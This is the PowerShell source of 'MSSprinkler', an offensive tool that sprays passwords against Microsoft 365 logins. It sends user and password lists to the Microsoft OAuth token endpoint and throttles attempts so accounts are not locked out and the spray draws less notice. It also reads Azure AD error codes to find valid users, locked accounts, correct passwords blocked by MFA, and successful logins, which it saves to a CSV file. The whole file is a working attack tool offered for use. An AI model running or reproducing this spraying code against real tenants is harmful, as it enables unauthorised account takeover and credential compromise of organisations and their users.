function Invoke-MSSprinkler{
<#
    .Synopsis
        MSSprinkler is a password spraying utility that targets M365 accounts. It employs a 'low-and-slow' approach to avoid locking out accounts, and provides verbose information related to accounts / tenant information.

    .Description
        Version: 0.2
        Author: Connor Jackson
        GitHub: https://github.com/theresafewconors/mssprinkler

    .Parameter user
        A list of users to spray. One per line without commas. eg. user@tenant.com. Provide the path to the file.
    .Parameter pass
        A list of passwords to use. One per line without commas. Provide the path to the file.
    .Parameter threshold
        The threshold for the maximum number of attempts to make per min. Default is 8 if no value is provided.
    .Parameter URL
        URL to target. This will default to 'https://login.microsoftonline.com' if no value is provided.
    .Parameter Output
        Name of output file to save results to.

    .Example
        Invoke-MSSprinkler -user .\users.txt -pass .\passwords.txt -threshold 12
        Invoke-MSSprinkler -us .\users.txt -p .\passwords.txt -t 12
    #>

Param(
    [string]$user,
    [string]$pass,
    [int]$threshold = 8,
    [string]$url = 'https://login.microsoftonline.com',
    [string]$output
)

# Environment variables for output file
$datetime = Get-Date -UFormat "%m/%d/%Y %R %Z"
$sprayResult = @()

# Create a list of usernames + passwords to try
$usernames = Get-Content $user
$passwords = Get-Content $pass
$total = $usernames.count * $passwords.count
$exptime = $total / $threshold

Write-Host -ForegroundColor "yellow" "[*] The url to attack is" $url
Write-Host -ForegroundColor "red" "[*] " $usernames.count "user(s) detected"
Write-Host -ForegroundColor "red" "[*] " $passwords.count "password(s) detected"
Write-Host -ForegroundColor "cyan" "[*] operating at" $threshold "spraying attempts per min. $total combinations found. Expected time to complete is $exptime mins"
if ($output -ne ""){
    Write-Host -ForegroundColor "yellow" "[*] Results will be saved to $output"
}
Write-Host -ForegroundColor "red" "[*] Starting Spray..."

# Init the hashtable
$errorResonseValues = @{}

# Error ID = (plaintext, csv result) Reference: https://learn.microsoft.com/en-us/entra/identity-platform/reference-error-codes
$errorResonseValues["AADSTS50126"] = @("    The password for <username> appears to be incorrect.", "Failure")
$errorResonseValues["AADSTS50053"] = @("    WARNING! <username> appears to be locked, skipping further attempts", "Account Locked")
$errorResonseValues["AADSTS90002"] = @("    WARNING! <username> appears to be locked, skipping further attempts", "Account Locked")
$errorResonseValues["AADSTS50034"] = @("    The user <username> not found, tenant appears correct. Skipping further attempts..", "User Does Not Exist")
$errorResonseValues["AADSTS50059"] = @("    Supplied tenant for <username> not found, skipping further attempts..", "Tenant Does Not Exist")
$errorResonseValues["AADSTS50076"] = @("[*] Password for <username> is correct but user has MFA enabled (DUO or MS)", "Correct Password, MFA Blocked")
$errorResonseValues["AADSTS90014"] = @("    Issue with request")

# Regex for the error ID starting with AADSTS..
$regex = 'AADSTS\d{5}'

$ErrorActionPreference = 'silentlycontinue'
for ($counter = 0; $counter -lt $usernames.length; $counter++) {
    $un = $usernames[$counter]
    foreach ($passes in $passwords) {
        # Web Request Info
        $body = @{ 'client_id' = '5aa316d3-d05a-485f-a849-e05182f87d1d'; 'grant_type' = 'password'; username = $un; password = $passes; scope = 'openid' }
        $headers = @{ Accept = 'application/json'; 'Content-Type' = 'application/x-www-form-urlencoded' }
        $response = Invoke-WebRequest -Uri "$url/organizations/oauth2/v2.0/token" -Method Post -Body $body -Headers $headers -ErrorVariable errorResponse

        # Convert error to string
        $errorResponseString = $errorResponse | Out-String

        # Successful login attempt
        if ($response.StatusCode -eq 200) {
            Write-Host -ForegroundColor "green" "[*] SUCCESS! $un : $passes"
            $sprayResult += "$datetime, Success, $un, $passes"
            $response = ""
            Start-Sleep (60 / $threshold)
            break
        } else {
            # Handle unsuccessful attempts
            if ($errorResponseString -match 'AADSTS\d{5}') {
                $errorCode = $matches[0]
                if ($errorResonseValues.ContainsKey($errorCode)) {
                    # Get error message and replace <username> with the actual username
                    $values = $errorResonseValues[$errorCode]
                    $message = $values[0] -replace '<username>', $un
                    # Special case for locked accounts, incorrect tenants or user not found
                    if ($errorCode -eq "AADSTS50059" -or $errorCode -eq "AADSTS50034" -or $errorCode -eq "AADSTS50053") {
                        Write-Host -ForegroundColor "Yellow" "$message"
                        Start-Sleep (60 / $threshold)
                        break
                    } else {
                        Write-Host "$message"
                        $sprayResult += "$datetime, $($values[1]), $un, $passes"
                        Start-Sleep (60 / $threshold)
                    }
                } else {
                    Write-Host "Unhandled error code: $errorCode"
                    Start-Sleep (60 / $threshold)
                }
            }
        }
    }
}

# Write the output to a CSV file:
if ($output) {
    $sprayResult | Out-File -Encoding ascii $output
}
}